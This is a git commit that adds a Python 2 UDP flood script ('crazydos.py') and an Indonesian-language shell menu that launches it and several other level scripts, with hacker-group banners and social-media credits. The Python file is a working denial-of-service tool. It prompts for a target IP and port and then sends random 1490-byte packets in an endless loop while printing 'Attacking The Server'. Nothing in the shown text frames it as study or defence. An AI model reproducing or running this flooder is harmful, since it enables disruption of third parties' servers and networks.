5d413b0762cce2dbabe612f15ed5f26a95643b9f
R133F <48719300+R133F@users.noreply.github.com>
2019-05-22 21:42:05 +0800

    Add files via upload

---
+++ crazydos.py
@@ -0,0 +1,65 @@
+
+
+import sys
+import os
+import time
+import socket
+import random
+#TIMES
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+##
+
+os.system("clear")
+os.system("figlet I N D O N Y M O U S")
+
+
+print """\033[31;1m
+         `/ymMMMMMMMMMMMMMMmy/`
+       /hMMMMMMMMMMMMMMMMMMMMMMh/
+     /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
+   `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
+  .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
+ `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
+ ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
+`my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
+-h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
+-N.o.sMmMMMNh/:-`-Mo\033[37;1msM-`-:/hNMMMmMs.+.N-
+`ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
+ s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
+ `mo/-:+ymMm                mMms+:-/om`
+  .h/+/y`hhs                yyh`y/+/h.
+   `hd/::-+.                .+-::/dy`
+     /hs+/::.--          --.::/+sh:
+       :hds+/-`          `-/+sdh:
+         `/ymM+          oMmy/"""
+print "\033[32;1mWELCOME TO Crazy ATTACKER DDOS LEVEL-1"
+print "\033[31;1mWE FIGHT EVIL !"
+print "\033[32;1mWE NEVER GIVE UP"
+print "\033[32;1mFROM ZERO TO HERO"
+print "\033[31;1mDONT FORGIVE YOUR ENEMY"
+print "\033[32;1mTHANKS FOR YOUR SUPPORT ^_^"
+print "\033[31;1mThanks To : Rief"
+ip = raw_input("Target's IP = ")
+port = input("Ports = ")
+
+os.system("clear")
+print "WAIT FOR 5 SECONDS FOR BEGIN THE ATTACKS !"
+time.sleep(5)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 10000000000000
+     port = port + 0
+     print "\033[31;1mAttacking The Server ! %s %s port:%s "%(sent,ip,port)
+     if port == 65534:
+       port = 0
---
+++ crazydos.sh
@@ -0,0 +1,102 @@
+#usr/!/sh
+Cy='\033[34;1m' #biru  
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+e='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+clear
+echo "▒▒▒▒▒▒▐███████▌
+▒▒▒▒▒▒▐░▀░▀░▀░▌
+▒▒▒▒▒▒▐▄▄▄▄▄▄▄▌
+▄▀▀▀█▒▐░▀▀▄▀▀░▌▒█▀▀▀▄
+▌▌▌▌▐▒▄▌░▄▄▄░▐▄▒▌▐▐▐▐
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
+█░░║║║╠─║─║─║║║║║╠─░░█
+█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" | lolcat
+figlet -f slant "Crazydos" | lolcat
+echo $me"                 W A R N I N G"
+echo $me"JANGAN PAKAI SC INI KALAU KALIAN PAKE KUOTA/PACKETAN"
+echo $me"KARENA SIZE SC INI SANGAT GILA (10MB/DETIK) "
+echo $me"PAKE WIFI KALAU MAU DDOS PAKE SC INI"
+echo "T H A N K S  T O  R 1 3 F  G A N Z :V
+        THE SCRIPT MAKER
+Youtube : Bloody Gaming71
+Youtube2: Bloody System1
+Facebook: Mohammad Kelvin
+  IGEH  : Mr.Cyber / BloodySystem1" | lolcat
+sleep 1
+
+echo "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+   ─> 1.LEVEL-1
+   ─> 2.LEVEL-2
+   ─> 3.LEVEL-3
+   ─> 4.LEVEL-4
+   ─> 5.LEVEL-5
+   ─> 6.LEVEL-6
+   ─> 7.LEVEL-MAX
+   ─> 8.EXIT/KELUAR
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" | lolcat
+echo $i  "╭──{LEVEL-BERAPA}─"$ku"[R13F]"                              
+read -p " ╰─> " pil
+
+if [ $pil = 1 ]
+then
+clear
+python2 crazydos.py
+fi
+
+if [ $pil = 2 ]
+then
+clear
+python2 crazydos2.py
+fi
+
+if [ $pil = 3 ]
+then
+clear
+python2 crazydos3.py
+fi
+
+if [ $pil = 4 ]
+then
+clear
+python2 crazydos4.py
+fi
+
+if [ $pil = 5 ]
+then
+clear
+python2 crazydos5.py
+fi
+
+if [ $pil = 6 ]
+then
+clear
+python2 crazydos6.py
+fi
+
+if [ $pil = 7 ]
+then
+clear
+python2 crazydosmax.py
+fi
+
+if [ $pil = 8 ]
+then
+clear
+echo "Makasih Udh pakai Tools Saya ^_^
+Jangan Lupa subscribe Channel yt saya : Bloody Gaming71/Bloody System1
+Kalau ada yg error silahkan Komen di video saya ^_^
+makasih atas support kalian yang membuat saya semangat membuat script script dan tools tools baru ^_^
+T H A N K S  T O : R 1 3 F
+D I  B U A T  O L E H : R 1 3 F  G A N Z :v
+Youtube : Bloody Gaming71
+Youtube2: Bloody System1
+Facebook:Moammad Kelvin
+   IG   :Mr.Cyber/Bloodysystem1" | lolcat
+
+fi
